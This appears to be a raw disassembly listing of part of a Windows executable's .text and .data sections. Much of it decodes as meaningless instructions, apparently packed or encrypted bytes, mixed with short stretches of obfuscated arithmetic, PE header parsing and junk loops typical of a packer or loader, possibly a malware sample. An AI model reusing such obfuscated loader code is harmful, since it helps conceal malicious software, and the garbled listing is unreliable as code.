  411342:	push   0xffffff89
  411344:	test   al,0x9
  411346:	rcr    DWORD PTR cs:[ebx],1
  411349:	cmp    ecx,0x3753c8c9
  41134f:	pop    ss
  411350:	icebp  
  411351:	sbb    edx,DWORD PTR [edi-0x4a]
  411354:	pop    esp
  411355:	mov    bh,0xd6
  411357:	add    ah,BYTE PTR [esi]
  411359:	les    edi,FWORD PTR [ebx]
  41135b:	xor    eax,0x3e391394
  411360:	cdq    
  411361:	arpl   WORD PTR [esi+0x38d09986],bp
  411367:	mov    bl,0x32
  411369:	pop    es
  41136a:	jnp    0x411321
  41136c:	jbe    0x411381
  41136e:	mov    edi,0x549996fb
  411373:	add    eax,0x3c78baab
  411378:	std    
  411379:	xor    BYTE PTR [eax-0x276f9ddf],ah
  41137f:	mov    esi,0xc40d1ae6
  411384:	out    dx,al
  411385:	stos   WORD PTR es:[edi],ax
  411387:	xor    al,0x6e
  411389:	mov    bh,0x5c
  41138b:	add    ah,BYTE PTR [edi]
  41138d:	pop    esp
  41138e:	sbb    edi,DWORD PTR [esi-0x70]
  411391:	push   edx
  411392:	and    al,0xd4
  411394:	retf   0xdf66
  411397:	outs   dx,DWORD PTR ds:[esi]
  411398:	sbb    DWORD PTR [esi-0x69],esp
  41139b:	call   0x44991a9f
  4113a0:	inc    esp
  4113a1:	pop    esi
  4113a2:	iret   
  4113a3:	xchg   ecx,eax
  4113a4:	or     eax,0x942605b1
  4113a9:	aam    0xe5
  4113ab:	jmp    FWORD PTR [edi-0x2d]
  4113ae:	add    al,0x49
  4113b0:	mov    dl,0x41
  4113b2:	sbb    edx,eax
  4113b4:	stc    
  4113b5:	mov    edx,0x78e778ab
  4113ba:	iret   
  4113bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113bc:	bnd jns 0x411364
  4113bf:	test   BYTE PTR [ebp-0x4a],ch
  4113c2:	cmp    BYTE PTR [ebp+0x2cb8c705],ch
  4113c8:	push   ecx
  4113c9:	inc    edx
  4113ca:	addr16 retf 
  4113cc:	add    esp,DWORD PTR [ebx-0x1e969bc6]
  4113d2:	int3   
  4113d3:	cmc    
  4113d4:	cmp    eax,0x4f8d7b34
  4113d9:	push   esp
  4113da:	pushf  
  4113db:	loope  0x411385
  4113dd:	or     al,0x7e
  4113df:	sbb    ebx,DWORD PTR [ebx]
  4113e1:	into   
  4113e2:	dec    ecx
  4113e3:	jecxz  0x4113b9
  4113e5:	or     eax,0x9b3e0452
  4113ea:	pop    esi
  4113eb:	dec    esp
  4113ec:	sbb    bl,BYTE PTR [ecx]
  4113ee:	add    bl,BYTE PTR [edx]
  4113f0:	or     al,0x3a
  4113f2:	jge    0x41139a
  4113f4:	push   ss
  4113f5:	push   ds
  4113f6:	mov    DWORD PTR [esi-0x5f],edx
  4113f9:	or     al,0x65
  4113fb:	mov    esi,0xf54fa49e
  411400:	mov    ebp,0xfccf95
  411405:	xor    al,0xe0
  411407:	sub    eax,0xa80065d8
  41140c:	push   ebp
  41140d:	rol    DWORD PTR [edx+0x4e853625],cl
  411413:	stc    
  411414:	jo     0x411447
  411416:	retf   
  411417:	cli    
  411418:	cdq    
  411419:	ja     0x411416
  41141b:	push   cs
  41141c:	pushf  
  41141d:	cmp    al,0xb4
  41141f:	mov    ebp,0xab43a05e
  411424:	loop   0x411409
  411426:	ret    0x74f0
  411429:	add    edi,DWORD PTR [esi-0x30c17a0f]
  41142f:	push   ebp
  411430:	cmp    ebx,DWORD PTR [ebp+0x35]
  411433:	fstp   st(5)
  411435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411436:	xor    DWORD PTR [edi-0x67],0xc857d218
  41143d:	imul   ecx,DWORD PTR gs:[eax],0x3bc1ab78
  411444:	pop    DWORD PTR [eax-0x3b]
  411447:	pop    ebp
  411448:	popa   
  411449:	jmp    0xbfd8eae
  41144e:	aad    0xb6
  411450:	not    DWORD PTR [edx+0x44966305]
  411456:	inc    ecx
  411457:	xchg   edx,eax
  411458:	add    eax,0xca4fca2f
  41145d:	inc    ebx
  41145e:	out    dx,eax
  41145f:	xchg   ecx,eax
  411460:	inc    ecx
  411461:	mov    ah,0xc
  411463:	dec    eax
  411464:	cmp    edx,DWORD PTR [edx+0x22]
  411467:	sub    eax,0xceb485e
  41146c:	xchg   ebp,eax
  41146d:	pop    edi
  41146e:	adc    DWORD PTR [edi+0x48],esp
  411471:	retf   
  411472:	sbb    BYTE PTR [edx+0x5867ab32],ah
  411478:	xor    eax,DWORD PTR [ebp+0x7]
  41147b:	jo     0x41144f
  41147d:	xor    al,0x67
  41147f:	jl     0x411413
  411481:	jle    0x4114dd
  411483:	inc    eax
  411484:	repz mov edx,0xacf4be5a
  41148a:	pusha  
  41148b:	cli    
  41148c:	test   al,0x0
  41148e:	fs aas 
  411490:	mov    dl,0x43
  411492:	push   ecx
  411493:	dec    esi
  411494:	xchg   esi,eax
  411495:	hlt    
  411496:	push   0x2e
  411498:	vpavgb xmm5,xmm3,XMMWORD PTR [edx]
  41149c:	arpl   WORD PTR [ebx-0x79bc60b0],di
  4114a2:	das    
  4114a3:	nop
  4114a4:	lods   eax,DWORD PTR ds:[esi]
  4114a5:	rcr    esi,cl
  4114a7:	pop    edi
  4114a8:	sbb    ch,bh
  4114aa:	mov    al,ds:0x738f47b6
  4114af:	inc    edi
  4114b0:	mov    dh,dl
  4114b2:	js     0x41151a
  4114b4:	fcom   DWORD PTR [edx+0x52]
  4114b7:	loopne 0x411512
  4114b9:	pop    edi
  4114ba:	js     0x411514
  4114bc:	mov    esi,0x8c70d461
  4114c1:	push   esp
  4114c2:	jae    0x411533
  4114c4:	sti    
  4114c5:	je     0x4114ed
  4114c7:	nop
  4114c8:	je     0x8ecf46c3
  4114ce:	or     al,BYTE PTR fs:[ecx+0x5f]
  4114d2:	outs   dx,DWORD PTR ds:[esi]
  4114d3:	ss in  al,0x82
  4114d6:	xlat   BYTE PTR ds:[ebx]
  4114d7:	cmp    ah,BYTE PTR [ecx+0x12a4fd58]
  4114dd:	sar    BYTE PTR [eax],0xb6
  4114e0:	jg     0x411549
  4114e2:	mov    WORD PTR [eax+0x2b],ds
  4114e5:	test   BYTE PTR [esi-0x4002d2ea],al
  4114eb:	adc    DWORD PTR [edi+0xa],esi
  4114ee:	(bad)  
  4114ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114f0:	cmp    dh,BYTE PTR [edi]
  4114f2:	(bad)  
  4114f3:	fimul  WORD PTR [ebp+0x4]
  4114f6:	stos   BYTE PTR es:[di],al
  4114f8:	cld    
  4114f9:	fcom   QWORD PTR [esi+0x546a7709]
  4114ff:	sub    BYTE PTR [edx+0x38e42bc3],0x25
  411506:	stos   DWORD PTR es:[edi],eax
  411507:	or     ecx,0x5179cfc2
  41150d:	xchg   edi,eax
  41150e:	loop   0x4114bd
  411510:	enter  0x96e3,0xb4
  411514:	xor    edi,eax
  411516:	sahf   
  411517:	mov    bh,0x0
  411519:	mov    esp,0xf9d6b920
  41151e:	ret    0xd6bb
  411521:	xchg   ecx,eax
  411522:	int3   
  411523:	imul   eax,DWORD PTR [eax-0x8],0x39
  411527:	fistp  WORD PTR [ecx-0x48]
  41152a:	call   0x2d1133f
  41152f:	sub    ch,dh
  411531:	adc    dh,BYTE PTR [edx]
  411533:	fmul   st,st(5)
  411535:	sbb    esi,eax
  411537:	les    eax,FWORD PTR [esi]
  411539:	add    DWORD PTR [esp+edx*4],esi
  41153c:	popa   
  41153d:	mov    ebx,0x8805e35f
  411542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411543:	mov    edx,0x26160d9c
  411548:	lods   al,BYTE PTR ds:[esi]
  411549:	mov    al,ds:0xe28b8d79
  41154e:	fucomp st(0)
  411550:	sub    eax,0xacb0b954
  411555:	sub    BYTE PTR [esi+ebx*8+0xb51d30c],0x5
  41155d:	call   0x40caa465
  411562:	leave  
  411563:	push   eax
  411564:	gs inc edi
  411566:	sti    
  411567:	pop    ebp
  411568:	and    bh,BYTE PTR [ecx+0x2fd0f55b]
  41156e:	sub    DWORD PTR [esi-0x18],eax
  411571:	adc    cl,BYTE PTR [esp+ecx*2]
  411574:	sbb    DWORD PTR [edi+0x6894a767],esp
  41157a:	clc    
  41157b:	daa    
  41157c:	push   ebp
  41157d:	mov    bh,0x1
  41157f:	loop   0x41153d
  411581:	out    dx,al
  411582:	xchg   ebx,eax
  411583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411584:	shl    BYTE PTR [ecx+0x5a],cl
  411587:	sbb    esp,DWORD PTR [ecx]
  411589:	and    ecx,DWORD PTR ds:0x88596c9
  41158f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411590:	(bad)  
  411591:	ret    0x7990
  411594:	jo     0x4115fc
  411596:	pop    ebx
  411597:	xchg   ecx,eax
  411598:	adc    ebx,DWORD PTR [ebx-0x41]
  41159b:	scas   eax,DWORD PTR es:[edi]
  41159c:	in     al,0x61
  41159e:	retf   0x3174
  4115a1:	nop    DWORD PTR [ecx]
  4115a4:	xor    al,0x1c
  4115a6:	or     eax,0xc4df52c1
  4115ab:	inc    eax
  4115ac:	push   ebx
  4115ad:	adc    al,0xf1
  4115af:	xchg   ecx,eax
  4115b0:	outs   dx,DWORD PTR ds:[esi]
  4115b1:	xor    eax,0xc5544810
  4115b6:	jmp    0x411617
  4115b8:	pop    es
  4115b9:	imul   ebp,DWORD PTR [esi-0x17],0x4c
  4115bd:	lods   al,BYTE PTR ds:[esi]
  4115be:	aaa    
  4115bf:	xor    eax,0xaf96d3a
  4115c4:	scas   eax,DWORD PTR es:[edi]
  4115c5:	add    eax,0xf1dae9
  4115ca:	pop    ebp
  4115cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115cc:	je     0x41159b
  4115ce:	outs   dx,BYTE PTR ds:[esi]
  4115cf:	jbe    0x4115fa
  4115d1:	leave  
  4115d2:	das    
  4115d3:	sbb    ecx,DWORD PTR [ebx-0x3eccf7ab]
  4115d9:	lea    eax,[eax+edx*1+0x32729b]
  4115e0:	mov    DWORD PTR [ebp+0x8],eax
  4115e3:	inc    DWORD PTR [ebp+0xc]
  4115e6:	jmp    0x410fe6
  4115eb:	mov    eax,DWORD PTR [ebp-0x10]
  4115ee:	xor    eax,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	scas   eax,DWORD PTR es:[edi]
  411619:	sub    esp,DWORD PTR [esi-0x6d]
  41161c:	xchg   BYTE PTR [eax+0x7e],al
  41161f:	jle    0x4115c5
  411621:	jg     0x4116a1
  411623:	jle    0x4116a2
  411625:	rol    ch,1
  411627:	xchg   ebp,eax
  411628:	jnp    0x41164c
  41162a:	inc    esi
  41162b:	repnz ins DWORD PTR es:[edi],dx
  41162d:	and    al,0xee
  41162f:	int3   
  411630:	xor    eax,0x859273ea
  411635:	cmp    DWORD PTR [ebp+0x1876b71c],ebp
  41163b:	cmp    BYTE PTR [edx+esi*8+0x29],dl
  41163f:	add    esi,DWORD PTR [eax+ecx*1]
  411642:	idiv   BYTE PTR [ecx+ecx*2]
  411645:	pop    ebx
  411646:	xchg   edx,eax
  411647:	outs   dx,DWORD PTR ds:[esi]
  411648:	nop
  411649:	pop    esp
  41164a:	mov    BYTE PTR [eax+0x22],al
  41164d:	inc    eax
  41164e:	xor    eax,0xeee4f4cc
  411653:	sbb    DWORD PTR [eax+0x6fa86cbc],edi
  411659:	xchg   esi,eax
  41165a:	inc    esp
  41165b:	xlat   BYTE PTR ds:[ebx]
  41165c:	inc    ebx
  41165d:	cwde   
  41165e:	inc    edx
  41165f:	ds inc esp
  411661:	imul   ebx,eax,0x31
  411664:	xor    al,0x7c
  411666:	and    dl,ah
  411668:	add    eax,DWORD PTR [esi-0x3e6006fa]
  41166e:	inc    eax
  41166f:	dec    ecx
  411670:	xchg   edx,eax
  411671:	sub    esi,esp
  411673:	and    BYTE PTR [edx],cl
  411675:	ins    DWORD PTR es:[edi],dx
  411676:	out    dx,eax
  411677:	dec    ecx
  411678:	rcl    BYTE PTR [edx+0x0],cl
  41167b:	mov    bl,0x63
  41167d:	ja     0x41169f
  41167f:	pusha  
  411680:	outs   dx,DWORD PTR ds:[esi]
  411681:	ss cld 
  411683:	addr16 mov ds:0xff0d,al
  411687:	pop    ebp
  411688:	ret    0x6c5f
  41168b:	mov    ah,BYTE PTR [ebp-0x757eabe3]
  411691:	shr    ebp,0xf
  411694:	test   BYTE PTR [esi+0x6c],dl
  411697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411698:	les    esp,FWORD PTR [ebp+eax*1+0x5a4562d8]
  41169f:	retf   0xc40f
  4116a2:	aaa    
  4116a3:	data16 stos BYTE PTR es:[edi],al
  4116a5:	jo     0x4116f8
  4116a7:	mov    bl,0x3b
  4116a9:	fsub   DWORD PTR [edx]
  4116ab:	xlat   BYTE PTR ds:[ebx]
  4116ac:	push   edi
  4116ad:	jl     0x41166b
  4116af:	pop    ds
  4116b0:	mov    cl,0x43
  4116b2:	imul   DWORD PTR [ecx]
  4116b4:	cmp    esp,DWORD PTR [ebp+0x35]
  4116b7:	popf   
  4116b8:	jecxz  0x4116a9
  4116ba:	dec    ebp
  4116bb:	mov    ds:0xfcd21c5a,eax
  4116c0:	and    al,0x7e
  4116c2:	lods   eax,DWORD PTR ds:[esi]
  4116c3:	sub    bl,BYTE PTR [eax]
  4116c5:	mov    ebp,0x9d7ade8d
  4116ca:	push   0x3eeb15d9
  4116cf:	xchg   ecx,eax
  4116d0:	cwde   
  4116d1:	nop
  4116d2:	stos   DWORD PTR es:[edi],eax
  4116d3:	push   esi
  4116d4:	pusha  
  4116d5:	jbe    0x4116d9
  4116d7:	mov    ebx,0xd9099fb3
  4116dc:	fwait
  4116dd:	(bad)  
  4116de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116df:	mov    esp,0xfde64e3e
  4116e4:	in     al,0xe2
  4116e6:	adc    BYTE PTR [esi],ah
  4116e8:	cli    
  4116e9:	push   eax
  4116ea:	mov    WORD PTR [edx-0x58ca6a31],ss
  4116f0:	(bad)  
  4116f1:	out    dx,al
  4116f2:	push   ebp
  4116f3:	xchg   esp,eax
  4116f4:	(bad)  
  4116f5:	xchg   ecx,eax
  4116f6:	es popf 
  4116f8:	jge    0x411766
  4116fa:	call   0xeccb7a53
  4116ff:	adc    al,0xf4
  411701:	mov    eax,ds:0x3453b39b
  411706:	push   esp
  411707:	jo     0x411727
  411709:	icebp  
  41170a:	mov    dl,0xfb
  41170c:	lds    ebx,FWORD PTR [edi-0xf]
  41170f:	scas   eax,DWORD PTR es:[edi]
  411710:	int3   
  411711:	cwde   
  411712:	mov    al,ds:0xc39607a2
  411717:	xchg   esp,eax
  411718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411719:	mov    edx,0x79784aa0
  41171e:	sar    BYTE PTR [edx+0x276e69a3],0x2c
  411725:	test   DWORD PTR [ecx+0x5537b5f8],ecx
  41172b:	mov    cl,0x9a
  41172d:	pop    ecx
  41172e:	sbb    DWORD PTR [esi+0x5c],eax
  411731:	into   
  411732:	push   cs
  411733:	add    BYTE PTR [ebp-0x19],al
  411736:	add    DWORD PTR [eax],esi
  411738:	xor    BYTE PTR [edi-0x7b],al
  41173b:	fnstenv [edi+0x561da0c2]
  411741:	xor    eax,0x94d2360a
  411746:	pop    eax
  411747:	lods   eax,DWORD PTR ds:[esi]
  411748:	jns    0x411765
  41174a:	pop    ds
  41174b:	(bad)  
  41174c:	out    dx,eax
  41174d:	dec    ecx
  41174e:	fsub   st(7),st
  411750:	cwde   
  411751:	leave  
  411752:	enter  0x9fa4,0x6c
  411756:	dec    edx
  411757:	mov    ah,0xec
  411759:	mov    ebx,0x483ae310
  41175e:	leave  
  41175f:	popf   
  411760:	xor    DWORD PTR [edx+0x6539e954],esp
  411766:	dec    ebp
  411767:	ret    
  411768:	push   ds
  411769:	pop    edi
  41176a:	in     eax,0x68
  41176c:	ror    BYTE PTR [esp+ebx*8],cl
  41176f:	mov    ch,0x81
  411771:	dec    ebx
  411772:	out    0x72,eax
  411774:	mov    bl,0x3b
  411776:	repnz mov WORD PTR [ebp-0x7d92548b],?
  41177d:	sti    
  41177e:	icebp  
  41177f:	or     bl,dh
  411781:	adc    bh,BYTE PTR [ebp-0x47]
  411784:	sub    DWORD PTR [edx],edx
  411786:	test   eax,0xf4c36836
  41178b:	arpl   WORD PTR [edi-0x47],si
  41178e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41178f:	sub    BYTE PTR [esi+0x25],dl
  411792:	retf   0x910
  411795:	iret   
  411796:	inc    ebx
  411797:	dec    ebx
  411798:	sti    
  411799:	arpl   ax,dx
  41179b:	jp     0x411763
  41179d:	pushf  
  41179e:	pop    eax
  41179f:	out    dx,al
  4117a0:	retf   0x7333
  4117a3:	aad    0x6a
  4117a5:	sub    DWORD PTR [ebx-0x4a7ed810],ecx
  4117ab:	pop    ecx
  4117ac:	dec    ebx
  4117ad:	iret   
  4117ae:	jnp    0x4117d0
  4117b0:	pusha  
  4117b1:	out    dx,eax
  4117b2:	arpl   WORD PTR [ebx],cx
  4117b4:	outs   dx,DWORD PTR ds:[esi]
  4117b5:	dec    ecx
  4117b6:	mov    ds:0x45b37d97,al
  4117bb:	jmp    0x411775
  4117bd:	std    
  4117be:	iret   
  4117bf:	lahf   
  4117c0:	call   0xb0dac285
  4117c5:	sahf   
  4117c6:	xlat   BYTE PTR ds:[ebx]
  4117c7:	adc    al,0x6d
  4117c9:	jmp    0x458b:0x28602cc
  4117d0:	or     bh,al
  4117d2:	add    eax,0x4337a3
  4117d7:	cmp    eax,0x8a000042
  4117dc:	add    BYTE PTR [ecx+0x4336ff2d],al
  4117e2:	add    BYTE PTR [ebp+0x6d],bh
  4117e5:	add    BYTE PTR [eax],al
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43379f,0x433703
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43379f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43371b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x4337ab,0x0
  41182f:	mov    eax,ds:0x4337ab
  411834:	inc    eax
  411835:	mov    ds:0x4337ab,eax
  41183a:	cmp    DWORD PTR ds:0x4337ab,0xb
  411841:	jne    0x411887
  411847:	push   0x4338bc
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x4337ab,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x4337ab
  411899:	inc    eax
  41189a:	mov    ds:0x4337ab,eax
  41189f:	cmp    DWORD PTR ds:0x4337ab,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	retf   0xebef
  4118ea:	jnp    0x411918
  4118ec:	dec    esi
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x411948
  4118f4:	shl    DWORD PTR [edx-0x1d31df72],cl
  4118fa:	xchg   edi,eax
  4118fb:	pop    eax
  4118fc:	adc    DWORD PTR [esi],ebx
  4118fe:	push   ecx
  4118ff:	fdivr  st(3),st
  411901:	sbb    cl,BYTE PTR [edx+0x5a]
  411904:	(bad)  
  411905:	pop    edx
  411906:	mov    ?,WORD PTR [edi+0xbf778d]
  41190c:	and    BYTE PTR [esi+0x50],dl
  41190f:	jecxz  0x41195e
  411911:	pop    ebp
  411912:	js     0x411896
  411914:	mov    eax,esp
  411916:	cli    
  411917:	pop    ss
  411918:	out    0xce,eax
  41191a:	rcl    BYTE PTR [edx+0x6],0xbf
  41191e:	jno    0x411940
  411920:	inc    ecx
  411921:	aas    
  411922:	mov    edi,0x78b88a92
  411927:	(bad)  
  411928:	clc    
  411929:	(bad)  
  41192a:	push   edx
  41192b:	std    
  41192c:	or     DWORD PTR [edi-0x54e1d1e3],esp
  411932:	mov    edi,0xf0f6dc56
  411937:	inc    edx
  411938:	dec    ebp
  411939:	add    DWORD PTR [ecx],ecx
  41193b:	and    bl,BYTE PTR [esi+0xb]
  41193e:	ret    0x1572
  411941:	pop    DWORD PTR [ecx-0xb]
  411944:	dec    edx
  411945:	xchg   ch,bh
  411947:	push   ss
  411948:	mov    cl,0x3
  41194a:	mov    ebx,0x4f4c5345
  41194f:	mul    esi
  411951:	cld    
  411952:	rol    BYTE PTR [eax-0x6622a615],1
  411958:	leave  
  411959:	mov    ds,WORD PTR [ebx]
  41195b:	sar    DWORD PTR [edx-0x76],0xeb
  41195f:	call   0x6c09:0x7c258229
  411966:	mov    ebx,0x12ad330d
  41196b:	scas   al,BYTE PTR es:[edi]
  41196c:	pop    es
  41196d:	fadd   QWORD PTR [ebx-0x4cd67703]
  411973:	loop   0x411988
  411975:	not    BYTE PTR [ecx-0x3d]
  411978:	xor    DWORD PTR [esi-0x112a4ef6],esi
  41197e:	mov    BYTE PTR [eax],ah
  411980:	mov    ecx,0x562abafe
  411985:	sahf   
  411986:	ror    BYTE PTR [esp+ecx*4-0x12],0x6b
  41198b:	aaa    
  41198c:	mov    edx,0x94e47e86
  411991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411992:	and    al,bh
  411994:	fidivr WORD PTR [edi+0x2ec8ffff]
  41199a:	xor    DWORD PTR [ebx-0x31],ebx
  41199d:	scas   al,BYTE PTR es:[edi]
  41199e:	and    esp,DWORD PTR [ebx+0x3a]
  4119a1:	push   cs
  4119a2:	mov    ds:0x4b2f1cc0,al
  4119a7:	popa   
  4119a8:	scas   eax,DWORD PTR es:[edi]
  4119a9:	jmp    0x411a29
  4119ab:	mov    al,ds:0x1349ab35
  4119b0:	xchg   esp,eax
  4119b1:	les    eax,FWORD PTR [edx]
  4119b3:	into   
  4119b4:	out    dx,eax
  4119b5:	loope  0x4119b9
  4119b7:	xor    DWORD PTR [edi],edi
  4119b9:	push   cs
  4119ba:	ret    
  4119bb:	mov    cl,0xc4
  4119bd:	cs pop ebp
  4119bf:	aaa    
  4119c0:	mov    DWORD PTR [esi+0x663270f4],ebp
  4119c6:	popf   
  4119c7:	push   edi
  4119c8:	sbb    BYTE PTR [edi-0x7934053e],0x2d
  4119cf:	popf   
  4119d0:	cld    
  4119d1:	xor    al,0xa4
  4119d3:	mov    ch,0x69
  4119d5:	mov    edi,0xd9a6e039
  4119da:	sbb    al,0x5d
  4119dc:	iret   
  4119dd:	retf   0x86ea
  4119e0:	(bad)  
  4119e1:	sar    BYTE PTR [edi],1
  4119e3:	(bad)  
  4119e4:	fnstenv [ebp+0x21220356]
  4119ea:	popa   
  4119eb:	mov    dh,0x40
  4119ed:	adc    DWORD PTR [ebx+edx*1],edx
  4119f0:	cs mov edx,0x52bbb50c
  4119f6:	or     DWORD PTR [edx-0x3b],ebp
  4119f9:	js     0x4119d5
  4119fb:	lock test BYTE PTR [ebx+0x13],al
  4119ff:	ins    DWORD PTR es:[edi],dx
  411a00:	lods   al,BYTE PTR ss:[esi]
  411a02:	pop    eax
  411a03:	int3   
  411a04:	mov    edx,DWORD PTR [eax+0x292de2bd]
  411a0a:	push   edi
  411a0b:	mov    edx,0x79665128
  411a10:	rcl    BYTE PTR [edi-0x73],cl
  411a13:	dec    DWORD PTR [ebx-0x30]
  411a16:	test   cl,bh
  411a18:	mov    esp,0xecdc36d8
  411a1d:	popa   
  411a1e:	sbb    eax,0x132b999b
  411a23:	jno    0x4119ba
  411a25:	sbb    eax,0x24567a0d
  411a2a:	mov    bl,0xa2
  411a2c:	(bad)  
  411a2d:	test   eax,0xe276ba5b
  411a32:	adc    eax,0xbf230dcb
  411a37:	mov    ebp,0x6fb5b366
  411a3c:	js     0x411a55
  411a3e:	xor    al,0x7b
  411a40:	inc    ecx
  411a41:	xor    eax,0xb7b1d135
  411a46:	retf   
  411a47:	call   0xfb4441c2
  411a4c:	and    ebx,DWORD PTR [esp+esi*1-0x6d]
  411a50:	ret    
  411a51:	pop    ecx
  411a52:	je     0x411a87
  411a54:	repz dec esp
  411a56:	or     eax,0x82609eb0
  411a5b:	pop    edi
  411a5c:	pop    esp
  411a5d:	call   0xffa5:0xc00505ab
  411a64:	popf   
  411a65:	jmp    0xbc6c:0x9e839aa8
  411a6c:	push   ds
  411a6d:	cli    
  411a6e:	push   ebp
  411a6f:	fist   DWORD PTR [ebp-0x4648fc18]
  411a75:	int    0x70
  411a77:	loopne 0x411a7b
  411a79:	cmp    DWORD PTR [edx-0x16],ebx
  411a7c:	push   edi
  411a7d:	push   ss
  411a7e:	mov    cl,0xb7
  411a80:	mov    ah,0x6a
  411a82:	push   cs
  411a83:	aas    
  411a84:	dec    ecx
  411a85:	mov    edx,0xbb916d19
  411a8a:	mov    WORD PTR [esp+eiz*4+0x6a],cs
  411a8e:	cs enter 0x5560,0xe3
  411a93:	adc    al,0xc5
  411a95:	pop    es
  411a96:	pop    eax
  411a97:	dec    edi
  411a98:	mov    esi,0xc63d77ee
  411a9d:	add    eax,ecx
  411a9f:	jmp    0x411ab1
  411aa4:	mov    eax,DWORD PTR [ebp-0x4]
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
